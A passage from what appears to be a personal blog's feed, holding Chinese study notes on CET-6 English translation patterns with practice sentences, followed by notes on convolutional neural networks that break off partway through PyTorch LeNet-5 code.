        <content type="html"><![CDATA[<h1 id="六级翻译技巧"><a href="#六级翻译技巧" class="headerlink" title="六级翻译技巧"></a>六级翻译技巧</h1><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="1-找主干-添枝加叶-检查回读"><a href="#1-找主干-添枝加叶-检查回读" class="headerlink" title="1.找主干-添枝加叶-检查回读"></a><code>1.找主干-添枝加叶-检查回读</code></h3><ol><li>谁是什么 </li><li>谁做了什么</li><li>什么被做(be done)</li><li>修饰成分有动词 用定语从句</li></ol><h3 id="2-无主语"><a href="#2-无主语" class="headerlink" title="2.无主语"></a><code>2.无主语</code></h3><ol><li>添加 主语：people ,they ,we, he ,his,it</li><li>换成被动</li><li>there be</li></ol><h2 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h2><h3 id="之一"><a href="#之一" class="headerlink" title="之一"></a>之一</h3><ol><li>one of +名词复数形式</li></ol><blockquote><ol><li>水浒传是中国文学四大经典小说之一</li></ol></blockquote><pre class=" language-markdown"><code class="language-markdown">主干：水浒传是四大经典小说之一Water Margin is one of the four classical novels 完整翻译Water Margin is one of the four classical novels in chinese literature.</code></pre><blockquote><ol start="2"><li>明朝统治 中国276年，被人门描述成人类历史上治理有序，社会稳定的最伟大的时代之一</li></ol></blockquote><pre class=" language-markdown"><code class="language-markdown">主干：明朝  被人门描述成最伟大的时代之一Ming dynasty is described as one of the greatest periods(times)完整翻译The Ming Dynasty ,which ruled china for 276 years,is described as one of the greatest periods of orderly governance and social stability in human history</code></pre><h3 id="越来越"><a href="#越来越" class="headerlink" title="越来越"></a>越来越</h3><ol><li>an increasing number of  </li><li>more and more </li></ol><blockquote><ol><li>越来越多的外国读者 也感到这部小说里的故事生动感人，趣味盎然</li></ol></blockquote><pre class=" language-markdown"><code class="language-markdown">主干：外国读者 感到小说 故事生动感人和趣味盎然foreign readers find the stories in this novel vivid and interesting完整翻译：An increasing number of foreign readers also find the stories inthis novel vivid and interesting.</code></pre><blockquote><ol start="2"><li>随着中国经济的快速增长和全球影响力的增强，越来越多其他国家的人也开始学习汉语</li></ol></blockquote><pre class=" language-markdown"><code class="language-markdown">主干：越来越多的其他国家人也开始学习汉语an increasing number of the other countries people also start to learn chinese.完整翻译with the rapid development of chinese economy and improvement of global influence ,an increasing number of the other countries people also start to learn chinese.前后都是名词  of   A  of B  B的A</code></pre><blockquote><ol start="3"><li>近年来，中国越来越多的博物馆免费向公众开放</li></ol></blockquote><pre class=" language-markdown"><code class="language-markdown">in recent years,more and more museums are open to the public freeof charge in china.</code></pre><blockquote><ol start="4"><li>如今，展览形式越来越多样</li></ol></blockquote><pre class=" language-markdown"><code class="language-markdown">nowdays, there are more and more different forms of exhibition.</code></pre><blockquote><ol start="5"><li>越来越多的人也在假日乘高铁外出旅游</li></ol></blockquote><pre><code>an increasing number of people also travel on holidays by high-speed rail</code></pre><p>参考链接：<a href="https://www.bilibili.com/video/BV1qi4y1o7oi?p=1&vd_source=5e8f069711510b3788382a0a03ff38e5">2021下半年翻译必考知识点1_哔哩哔哩_bilibili</a></p><h3 id="无主语"><a href="#无主语" class="headerlink" title="无主语"></a>无主语</h3><blockquote><ol><li>千百年来，创作了许多诗歌和绘画赞美牡丹</li></ol></blockquote><pre class=" language-markdown"><code class="language-markdown">there beover thousands of years,there are many poetry and drawings that have been created to praise peony添加主语 people over thousands of years,chinese people have created many poetry and drawings to praise peony被动many poetry and drawings have been created to praise peony</code></pre><blockquote><ol start="2"><li>普通大众也都喜欢梅花，春节期间常用于家庭装饰</li></ol></blockquote><pre><code>common people also like plum blossom  ,During spring festival ,it is usually used to decorate house.during spring festival ,people usually use it to decorate house.</code></pre><blockquote><ol start="3"><li>方言被认为是当地文化的一个组成部分</li></ol></blockquote><pre class=" language-markdown"><code class="language-markdown">Dialects are considered as a  component of the local cultures.people consider dialect as a component of the local cultures.</code></pre><blockquote><ol start="4"><li>成语在日常会话和文学创作中广泛使用</li></ol></blockquote><pre><code>idioms are widely used in everyday conversation and in literary creation.</code></pre><blockquote><ol start="5"><li>今年来，也出现了许多数字图书馆，从而节省了存放图书所需的空间</li></ol></blockquote><pre><code>in recent years,there are many digital libaries to emerge,which save the space needed to store books.</code></pre><h3 id="原因从句"><a href="#原因从句" class="headerlink" title="原因从句"></a>原因从句</h3><ol><li>As ， since+句子</li><li>due to 加短语</li></ol><blockquote><ol><li>由于汉字有统一的书写形式，他门交流起来几乎没有任何困难</li></ol></blockquote><pre class=" language-markdown"><code class="language-markdown">Since Chinese characters are written in a uniform way,they hardly have any difficulty in communicating./they can communicate without any difficulty.</code></pre><blockquote><ol start="2"><li>随着中国经济的快速增长和全球影响力的增强，越来越多其他国家的人也开始学习汉语</li></ol></blockquote><pre class=" language-markdown"><code class="language-markdown">As the rapid growth of chinese economy and the improvement of global influence, an increasing number of people also  started to learn chinese</code></pre><blockquote><ol start="3"><li>可以预见，随着运动设施的不断改善，越来越多的人将回去体育馆健身</li></ol></blockquote><pre class=" language-markdown"><code class="language-markdown">it can be expected that as  the constant improvement of sports facilities, more and more people will go to the gym to keep fit.</code></pre><blockquote><ol start="4"><li>由于 空气污染 日益严重，现在越来越多的人选择购买新能源汽车</li></ol></blockquote><pre class=" language-markdown"><code class="language-markdown">As air pollution becomes more and more serious, now more and more people choose to purchase new energy cars.</code></pre><h3 id="有-（翻译）"><a href="#有-（翻译）" class="headerlink" title="有 （翻译）"></a>有 （翻译）</h3><ol><li>have ,has, had 拥有</li><li>there are /is/ were was/have been / will be  存在</li><li>with 伴随（频率很高）</li></ol><blockquote><ol><li>作为中国的国宝，武术有上百种 不同的风格，是世界上练的最多的武术形式</li></ol></blockquote><pre><code>as a national treasure(财富==宝贝) of china, there are hunderds of the different stycles of WuShu, which is the most praciced form of martial arts in the world.martial arts have hundreds of different styles and are the most practiced form </code></pre><blockquote><ol start="2"><li>华山过去很少有人光临，因为上山的道路极其危险</li></ol></blockquote><pre class=" language-markdown"><code class="language-markdown">there were few people to visit(参观) Mount Hua, because Mountain of road was extremely dangerous。</code></pre><blockquote><ol start="3"><li>他们可以乘飞机到达所有的城市，还有很多城市也在筹建机场</li></ol></blockquote><pre class=" language-markdown"><code class="language-markdown">they can arrive to all the big city by  plane, there are many city ,which are planning to build airports.they can fly to all the big city,</code></pre><h3 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h3><ol><li>什么什么 以来（时间段）： over  /for +时间段  . over the past for years  ,+ have /has /had done </li><li>自从什么什么时候（时间点）： Since , + 句子完成时态=（have /has +done)。</li></ol><blockquote><ol><li>数百年以来，当地人沿着河边建起了住宅和集市</li></ol></blockquote><pre class=" language-marKdown"><code class="language-marKdown">for  hundreds of years,local people have built  houses and markets( 住宅和集市)  along the river bank总结：了 是完成时态的标志</code></pre><blockquote><ol start="2"><li>几千年来，长江一直被用于供水，运输和工业生产</li></ol></blockquote><pre class=" language-markdown"><code class="language-markdown">for thousands of years, the Yangtze has been used  for water supply(供应，供给）,transportation（运输n)  and industrial(工业的) productiontransmit(v,运输，传播，传送)</code></pre><blockquote><ol start="3"><li>自上世纪90年代安装缆车以来，参观人数大大增加</li></ol></blockquote><pre class=" language-markdown"><code class="language-markdown">since the installation of the caber car in 1990,the number of(....的数量) visitors has increased(增加) greatly。improve:提升increase :增加</code></pre><blockquote><ol start="4"><li>在过去的几十年里，政府采取了各种措施防止灾害发生</li></ol></blockquote><pre><code>Over the past  decades(过去几十年）, the government has adopted all kinds of (各种各样的）measures to prevent  disasters(灾害)  which happen。Over the past decades ,the government has taken various measures to prevent disasters(灾害)take:采取（措施）; 需要…时间; 容纳;adopt:采用(某方法);采取(某态度);选举all kinds of :各种各样。various :各种。</code></pre><h3 id="可以追溯到"><a href="#可以追溯到" class="headerlink" title="可以追溯到"></a>可以追溯到</h3><ol><li>be traced back to  被追溯到 被动</li><li>go back to    追溯到 主动</li></ol><blockquote><ol><li>中国武术的起源可以追溯到自卫的需要</li></ol></blockquote><pre class=" language-markdown"><code class="language-markdown">the origin of Chinese martial arts（武术）  is traced back to the need of self-defence(自卫)martial art ：武术self-defence:自卫</code></pre><blockquote><ol start="2"><li>利用风来发电可以追溯到1890年</li></ol></blockquote><pre><code>Using wind to generate electricity goes back to 1890.generate:生产electricity:电harnessing:利用</code></pre><blockquote><ol start="3"><li>故事追溯到19世纪中叶</li></ol></blockquote><pre class=" language-markdown"><code class="language-markdown">the story goes back to the middle of 19th centurythe middle of :...的中间the 19th century:19世纪</code></pre><h3 id="因什么而闻名"><a href="#因什么而闻名" class="headerlink" title="因什么而闻名"></a>因什么而闻名</h3><ol><li>be known as:名号</li><li>be famous for :风景</li></ol><blockquote><ol><li>潍坊以“风筝之都”而闻名，已有将近2400年放飞风筝的历史</li></ol></blockquote><pre><code>wei fang is known as the “kite capital”,which has a history of flying kites for nearly 2400 years.a history of:...的历史nearly:将近</code></pre><blockquote><ol start="2"><li>他风景独特，尤其以日出和云海著称</li></ol></blockquote><pre><code>it has a unique view,and is especially famous for its sunrise and sea of cloudsscenery:风景views：风景unique :独特special:独特especially:尤其</code></pre><h3 id="坐落在"><a href="#坐落在" class="headerlink" title="坐落在"></a>坐落在</h3><ol><li>be located +介词 （in/ on/ along)</li></ol><blockquote><ol><li>乌镇是浙江的一座古老水镇，坐落在京杭大运河畔</li></ol></blockquote><pre class=" language-markdown"><code class="language-markdown">Wuzhen is an ancient town in Zhe Jiang,and it is locate along the river bank of Jing Hang grand canalWuzhen ,an ancient water town in ZheJiang province,is located along the river bank of Jing Hang grand canaltown:城镇province:省the river bank of:河边canal:运河</code></pre><blockquote><ol start="2"><li>长江上还坐落着世界上最大的水电站</li></ol></blockquote><pre class=" language-markdown"><code class="language-markdown">the  biggest hydropower station of the world is located in the  Long River(长江)hydropower station：发电站Long River:长江Yangtze River:长江is located in:坐落于the world's larget hydropower station lies on the Yangtze River.</code></pre><h3 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h3><ol><li> 形容词+名词：beautiful handsome</li><li>前后都是名词—-of，A of B—–B的A</li><li>修饰成分中有动词或者修饰成分比较长：定语从句</li></ol><blockquote><ol><li>昨天站在校门口等候我的那个同学，四六级必过</li></ol></blockquote><pre><code>that classmate,which stand at the school gate to wait for me yesterday, will surely pass the CET4 or CET6</code></pre><p><a href="https://www.bilibili.com/video/BV1qi4y1o7oi?p=5">2021下半年四六级翻译必考知识 5_哔哩哔哩_bilibili</a></p><h2 id="随手一写"><a href="#随手一写" class="headerlink" title="随手一写"></a>随手一写</h2><p>“正经人谁写日记啊，你写日记吗”</p><p>“我不写，你写日记吗”</p><p>“谁能把心里话写在日记里”</p><p>“写出来的那能叫心里话吗”</p><p>“下贱”——让子弹飞</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.bilibili.com/video/BV1qi4y1o7oi?p=2&vd_source=5e8f069711510b3788382a0a03ff38e5">2021下半年四六级 翻译考前50分 二_哔哩哔哩_bilibili</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 六级 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>卷积神经网络:CNN</title>
      <link href="/2022/10/27/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-CNN/"/>
      <url>/2022/10/27/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-CNN/</url>
      
        <content type="html"><![CDATA[<h1 id="CNN-卷积神经网络"><a href="#CNN-卷积神经网络" class="headerlink" title="CNN(卷积神经网络)"></a>CNN(卷积神经网络)</h1><h2 id="1-CNN-先验知识"><a href="#1-CNN-先验知识" class="headerlink" title="1.CNN 先验知识"></a>1.CNN 先验知识</h2><h3 id="1-浅层特征和深层特征"><a href="#1-浅层特征和深层特征" class="headerlink" title="1.浅层特征和深层特征"></a>1.浅层特征和深层特征</h3><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221027155227.jpg" alt="浅层和深层"></p><p><strong>浅层特征优缺点：</strong></p><p><strong>分辨率更高==》更多位置、细节信息，噪声更多。</strong></p><p><strong>深层特征优缺点：</strong></p><p><strong>分辨率低==》细节较差，噪声少，获取整体性信息</strong></p><p>参考链接：</p><p><a href="https://blog.csdn.net/m0_62311817/article/details/126064158">(19条消息) 卷积神经网络之“浅层特征”与“深层特征”_一个菜鸟的成长史的博客-CSDN博客_深层特征和浅层特征</a></p><p><a href="https://blog.csdn.net/ybdesire/article/details/78837688">(19条消息) 深层神经网络与浅层神经网络的区别_ybdesire的博客-CSDN博客_浅层网络与深层网络的差异</a></p><h3 id="2-CNN发展和人是如何识别图片"><a href="#2-CNN发展和人是如何识别图片" class="headerlink" title="2.CNN发展和人是如何识别图片"></a>2.CNN发展和人是如何识别图片</h3><p>参考博客：<a href="https://blog.csdn.net/weixin_41792162/article/details/118250917?ops_request_misc=&request_id=&biz_id=102&utm_term=cnn&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~sobaiduweb~default-0-118250917.nonecase&spm=1018.2226.3001.4450">(19条消息) CNN简单介绍及基础知识_Python大视觉的博客-CSDN博客_cnn介绍</a></p><h2 id="2-CNN-为什么出现"><a href="#2-CNN-为什么出现" class="headerlink" title="2.CNN 为什么出现"></a>2.CNN 为什么出现</h2><h3 id="1-全连接网络-缺陷"><a href="#1-全连接网络-缺陷" class="headerlink" title="1.全连接网络 缺陷"></a>1.全连接网络 缺陷</h3><blockquote><p>1.参数量大</p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221027160434.jpg" alt="参数量大"></p><p><strong>从图中可以得出结论全连接网络的缺点：</strong></p><ol><li><strong>参数量大</strong>：<strong>计算量大</strong></li><li><strong>过拟合：参数量大 数据就要增加，否则出现过拟合现象</strong></li></ol><blockquote><p>2.不具备特征不变性</p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221027155245.png" alt="缺点"></p><p><strong>不具备特征不变性：非常依赖于特征的位置：特征位置平移，形变，扭曲敏感。</strong></p><p><strong>全连接网络优点：</strong></p><p><strong><code>输入数据</code>的 <code>所有信息</code>都会得到有效的利用，因为 通过<code>全连接</code>的方式，<code>每一点信息都会对训练过程</code>做出“ 贡献 ”</strong></p><p><strong>参考链接：</strong></p><p><a href="https://www.cnblogs.com/kensporger/p/12267319.html#5hDZaDcy">冬日曙光——回溯CNN的诞生 - KenSporger - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/weixin_39670246/article/details/110604745">(19条消息) cnn神经网络_为什么会提出卷积神经网络(CNN)?CNN的基本框架_weixin_39670246的博客-CSDN博客</a></p><h3 id="2-卷积神经网络特征"><a href="#2-卷积神经网络特征" class="headerlink" title="2.卷积神经网络特征"></a>2.卷积神经网络特征</h3><blockquote><p>1.参数共享</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200722163245482.gif" alt="参数共享"></p><p><strong>参数共享</strong>是指在<strong>同一个模型的不同模块</strong>中<strong>使用相同的参数</strong>，它是<strong>卷积运算的 固有属性</strong>。<strong>全连接网络中</strong>，计算<strong>每层的输出</strong>时，<strong>权值参数矩阵中的每个元素只</strong>作用于某个<strong>输入元素一次</strong>；而在<strong>卷积神经网络</strong>中，<strong>卷积核中的每一个元素将作用于 每一次局部输入的特定位置上</strong>。根据<strong>参数共享的思想</strong>，我们<strong>只需要学习一组参数集合</strong>，而<strong>不需要针对每个位置的每个参数都进行优化</strong>，从而大大降低了模型的存 储需求。</p><p><strong>参数共享的物理意义</strong>是<strong>使得卷积层具有平移等变性</strong>。假如图像中有一只猫， 那么无论它出现在图像中的任何位置，我们都应该将它识别为猫，也就是说神经 网络的输出对于平移变换来说应当是等变的。</p><p>参考博客：</p><p><a href="https://www.cnblogs.com/MinPage/p/14237303.html">CNN中的卷积操作与参数共享 - 箐茗 - 博客园 (cnblogs.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/450030946">卷积神经网络中的稀疏交互和参数共享 - 知乎 (zhihu.com)</a></p><blockquote><p>2.局部连接</p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221027160420.jpg" alt="局部链接"></p><p><strong>局部感知</strong>：<strong>只连接相邻层的部分神经元</strong></p><p><strong>图像局部范围内的像素有较高的关联性</strong>，随着<strong>距离的加长</strong>，<strong>像素的信息相关性会降低</strong>，因此在<strong>连接神</strong></p><p><strong>经元时</strong>，<strong>不需要</strong>同时<strong>输入全局信息给单个神经元</strong>，只需要<strong>感知图像的局部信息</strong>，随着<strong>层数的增</strong></p><p><strong>加深层</strong>的<strong>神经元会拥有广阔的感受野</strong>，使得<strong>模型能准确表征图像的全局信息</strong>。</p><p><code>局部感受野，相比于全连接，它同时考虑某个局部区域，这样更容易提取到想要的特征</code></p><blockquote><p>3.特征不变性</p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221027155312.jpg" alt="不变性"></p><p>这里面尺寸大小不是放大或者缩小的图片。把一个图片放大或者缩小卷积网络是无法识别出来的</p><p>参考博客：<a href="https://www.cnblogs.com/kensporger/p/12267319.html#NZ574FW6">冬日曙光——回溯CNN的诞生 - KenSporger - 博客园 (cnblogs.com)</a></p><p>参考视频：<a href="https://www.bilibili.com/video/BV1sf4y1o7tg/?spm_id_from=333.880.my_history.page.click">卷积神经网络中的卷积、池化、局部连接以及权重共享-跟李沐老师动手学深度学习_哔哩哔哩_bilibili</a></p><h2 id="3-CNN-结构"><a href="#3-CNN-结构" class="headerlink" title="3.CNN 结构"></a>3.CNN 结构</h2><h3 id="1-输入层（数据预处理）"><a href="#1-输入层（数据预处理）" class="headerlink" title="1.输入层（数据预处理）"></a>1.输入层（数据预处理）</h3><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221027155736.jpg" alt="input"></p><p>对于<strong>CNN</strong>来说，<strong>一般只会做去均值+归一化</strong>，尤其是我们<strong>输入的是图像数据</strong>，我们<strong>往往只做去均值</strong>，这是<strong>为了保持原图像数据的完整性，避免失真</strong>。</p><blockquote><p>数据预处理优点</p></blockquote><pre><code>1. 简单的减均值操作都是可以加速收敛的1. 减少计算量，节省资源1. 降低陷入过拟合的问题</code></pre><p>参考博客:</p><p><strong>重点推荐</strong>：<a href="https://www.cnblogs.com/MinPage/p/13992071.html">深度学习之数据预处理 - 箐茗 - 博客园 (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/kongweisi/p/10987870.html">CNN（卷积神经网络）入门 - 胖白白 - 博客园 (cnblogs.com)</a></p><h3 id="2-卷积层（提取特征）"><a href="#2-卷积层（提取特征）" class="headerlink" title="2.卷积层（提取特征）"></a>2.卷积层（<strong>提取特征</strong>）</h3><blockquote><p>卷积层定义</p></blockquote><p><strong>卷积层（Convolutional layer）</strong>，<strong>卷积神经网络中每层卷积层由若干卷积单元(卷积核)组成</strong>，<strong>每个卷积单元的参数</strong>都是通过<strong>反向传播算法优化得到的</strong>。</p><blockquote><p>卷积运算目的</p></blockquote><p><strong>卷积运算的目</strong>的是<strong>提取输入的不同特征</strong>，<strong>第一层卷积层</strong>可能只能<strong>提取一些低级的特征如边缘</strong>、<strong>线条和角等层级</strong>，<strong>更多层的网路</strong>能从低级特征中迭代<strong>提取更复杂的特征</strong></p><blockquote><p>如何卷积运算</p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221027155607.jpg" alt="计算卷积"></p><p><strong><code>卷积核上的每个元素和对应输入数据的元素相乘，最后把所有的结果相加即卷积的结果</code></strong></p><p><img src="https://img-blog.csdnimg.cn/20200722163245482.gif" alt="卷积运算例子"></p><h3 id="3-池化层（压缩数据和参数，减小过拟合，降低网络的复杂度）"><a href="#3-池化层（压缩数据和参数，减小过拟合，降低网络的复杂度）" class="headerlink" title="3.池化层（压缩数据和参数，减小过拟合，降低网络的复杂度）"></a>3.池化层（<strong>压缩数据和参数，减小过拟合，降低网络的复杂度</strong>）</h3><blockquote><p>池化层 作用</p></blockquote><p><strong>池化层相比卷积层可以更有效的降低数据维度，这么做不但可以大大减少运算量，还可以有效的避免过拟合。</strong></p><p>参考博客：<a href="https://blog.csdn.net/qq_50645064/article/details/126181193">(19条消息) YOLOv5基础知识点——卷积神经网络_MUTA️的博客-CSDN博客_卷积神经网络yolov5</a></p><p><a href="https://blog.csdn.net/weixin_40519315/article/details/105115657?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-105115657-blog-107516873.pc_relevant_3mothn_strategy_and_data_recovery&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-105115657-blog-107516873.pc_relevant_3mothn_strategy_and_data_recovery&utm_relevant_index=1">(19条消息) 卷积神经网络CNN(卷积池化、感受野、共享权重和偏置、特征图)_玖零猴的博客-CSDN博客_卷积神经网络偏置</a></p><h4 id="1-最大池化"><a href="#1-最大池化" class="headerlink" title="1.最大池化"></a>1.最大池化</h4><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221027155545.jpg" alt="max"></p><h4 id="2-平均池化"><a href="#2-平均池化" class="headerlink" title="2.平均池化"></a>2.平均池化</h4><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221027155552.jpg" alt="avg"></p><p><strong>注意事项：</strong></p><p><strong><code>**池化层改变图像大小，不改变通道数：即输入是几通道，输出就是几通道**</code></strong></p><h3 id="4-激活层（增加非线性分割能力）"><a href="#4-激活层（增加非线性分割能力）" class="headerlink" title="4.激活层（增加非线性分割能力）"></a>4.激活层（<strong>增加非线性分割能力</strong>）</h3><blockquote><p>作用</p></blockquote><p><strong>作用：把卷积层输出结果做非线性映射</strong></p><blockquote><p>Relu激活函数</p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221027155534.jpg" alt="relu"></p><p><strong>优点：</strong></p><p><strong>解决梯度消失问题</strong></p><p><strong>计算速度快，只需要判断输入是否大与0.（SGD 的求解速度快于sigmoid 和tanh)</strong></p><p><strong>卷积神经网络激活函数选择忠告：</strong></p><p><strong>CNN 慎用sigmoid,优先使用RELU。</strong></p><p>激活函数作用可视化：<a href="http://playground.tensorflow.org/">http://playground.tensorflow.org/</a></p><p>参考博客：<a href="https://www.cnblogs.com/kongweisi/p/10987870.html">CNN（卷积神经网络）入门 - 胖白白 - 博客园 (cnblogs.com)</a></p><h3 id="5-全连接层"><a href="#5-全连接层" class="headerlink" title="5.全连接层"></a>5.全连接层</h3><blockquote><p>作用</p></blockquote><p><strong>全连接层在整个卷积神经网络中起到“分类器”的作用</strong></p><p><a href="https://www.bilibili.com/video/BV1pA4y1S7Z1/?spm_id_from=333.788&vd_source=5e8f069711510b3788382a0a03ff38e5">卷积神经网络原理 - 02 - 深层表示学习_哔哩哔哩_bilibili</a></p><p> 重点推荐 李沐：<a href="https://www.bilibili.com/video/BV1L64y1m7Nh/?spm_id_from=333.999.0.0">19 卷积层【动手学深度学习v2】_哔哩哔哩_bilibili</a></p><h2 id="4-CNN-参数"><a href="#4-CNN-参数" class="headerlink" title="4.CNN 参数"></a>4.CNN 参数</h2><h3 id="1-卷积核"><a href="#1-卷积核" class="headerlink" title="1.卷积核"></a>1.卷积核</h3><h4 id="1-大小：卷积核大小为奇数"><a href="#1-大小：卷积核大小为奇数" class="headerlink" title="1.大小：卷积核大小为奇数"></a>1.大小：卷积核大小为奇数</h4><p>*<em>1</em>1**</p><p>*<em>3</em>3**</p><p>*<em>5</em>5**</p><h4 id="2-单通道"><a href="#2-单通道" class="headerlink" title="2.单通道"></a>2.单通道</h4><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221027155623.jpg" alt="单通道"></p><h4 id="3-多通道"><a href="#3-多通道" class="headerlink" title="3.多通道"></a>3.多通道</h4><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221027155629.jpg" alt="多通道"></p><p><code>注意事项：</code></p><p><strong>卷积核通道要和输入特征图的通道数相同</strong></p><p><strong>有多少个卷积核就有多少个输出通道</strong></p><h3 id="4-步长和填充"><a href="#4-步长和填充" class="headerlink" title="4.步长和填充"></a>4.步长和填充</h3><p><strong>步长：卷积核每次移动大小</strong></p><p>**填充：输入和输出具有相同的大小    **</p><p><strong>参考链接：CNN 可视化调参</strong></p><p><a href="https://poloclub.github.io/cnn-explainer/#article-flatten">CNN Explainer (poloclub.github.io)</a></p><h3 id="5-卷积核大小-步长-填充-计算输出尺寸"><a href="#5-卷积核大小-步长-填充-计算输出尺寸" class="headerlink" title="5.卷积核大小 步长 填充 计算输出尺寸"></a>5.卷积核大小 步长 填充 计算输出尺寸</h3><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221027155706.jpg" alt="compute"></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221027155641.jpg" alt="步长填充计算输出"></p><pre class=" language-python"><code class="language-python">oh<span class="token punctuation">(</span>高<span class="token punctuation">)</span><span class="token operator">=</span>（<span class="token number">5</span><span class="token operator">+</span><span class="token number">2</span><span class="token operator">*</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">3</span>）<span class="token operator">/</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">5</span>ow<span class="token punctuation">(</span>宽<span class="token punctuation">)</span><span class="token operator">=</span>（<span class="token number">5</span><span class="token operator">+</span><span class="token number">2</span><span class="token operator">*</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">5</span></code></pre><h2 id="5-CNN实践：LeNet-5手写数字识别"><a href="#5-CNN实践：LeNet-5手写数字识别" class="headerlink" title="5.CNN实践：LeNet-5手写数字识别"></a>5.CNN实践：LeNet-5手写数字识别</h2><h3 id="1-LeNet-5结构"><a href="#1-LeNet-5结构" class="headerlink" title="1.LeNet-5结构"></a>1.LeNet-5结构</h3><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221027155656.jpg" alt="lenet-5"></p><h3 id="2-LeNet-5手写数字识别"><a href="#2-LeNet-5手写数字识别" class="headerlink" title="2.LeNet-5手写数字识别"></a>2.LeNet-5手写数字识别</h3><blockquote><p>1.导入相关库</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> torch<span class="token keyword">import</span> torch<span class="token punctuation">.</span>nn <span class="token keyword">as</span> nn<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">from</span> torchvision<span class="token punctuation">.</span>datasets <span class="token keyword">import</span> mnist<span class="token keyword">import</span> torchvision<span class="token punctuation">.</span>transforms <span class="token keyword">as</span> transforms<span class="token keyword">from</span> torch<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>data <span class="token keyword">import</span> DataLoader<span class="token keyword">import</span> torch<span class="token punctuation">.</span>optim <span class="token keyword">as</span> optim<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt</code></pre><blockquote><p>2.搭建LeNet-5</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 构造LeNet-5卷积神经网络</span><span class="token keyword">class</span> <span class="token class-name">LeNet5</span><span class="token punctuation">(</span>nn<span class="token punctuation">.</span>Module<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>in_channel<span class="token punctuation">,</span>output<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true"># in_channels输入通道数，output 输出</span>        super<span class="token punctuation">(</span>LeNet5<span class="token punctuation">,</span>self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#inchannels 输入通道，outchannels输出通道，kernel_size卷积核大小，stride 步长，padding填充尺寸</span>        self<span class="token punctuation">.</span>layer1<span class="token operator">=</span>nn<span class="token punctuation">.</span>Sequential<span class="token punctuation">(</span>        nn<span class="token punctuation">.</span>Conv2d<span class="token punctuation">(</span>in_channels<span class="token operator">=</span>in_channel<span class="token punctuation">,</span>out_channels<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span>kernel_size<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span>stride<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>padding<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true"># 6 28*28</span>            nn<span class="token punctuation">.</span>Tanh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#激活函数</span>            nn<span class="token punctuation">.</span>AvgPool2d<span class="token punctuation">(</span>kernel_size<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>stride<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>padding<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 6 14*14</span>        <span class="token punctuation">)</span>                self<span class="token punctuation">.</span>layer2<span class="token operator">=</span>nn<span class="token punctuation">.</span>Sequential<span class="token punctuation">(</span>        nn<span class="token punctuation">.</span>Conv2d<span class="token punctuation">(</span>in_channels<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span>out_channels<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">,</span>kernel_size<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span>stride<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>padding<span class="token operator">=</span><span class="token number">0</span><span class="token 